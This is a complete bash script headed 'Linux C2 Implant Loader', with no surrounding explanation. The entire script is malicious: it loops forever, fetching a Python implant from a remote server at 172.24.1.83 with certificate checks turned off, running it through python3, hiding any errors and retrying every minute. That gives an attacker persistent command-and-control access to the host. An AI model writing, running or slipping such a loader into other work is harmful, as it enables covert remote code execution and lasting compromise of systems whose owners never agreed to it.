#!/bin/bash
# Linux C2 Implant Loader
while true; do
    python3 -c "$(curl -k -s https://172.24.1.83:443/payloads/implant.py)" 2>/dev/null
    sleep 60
done
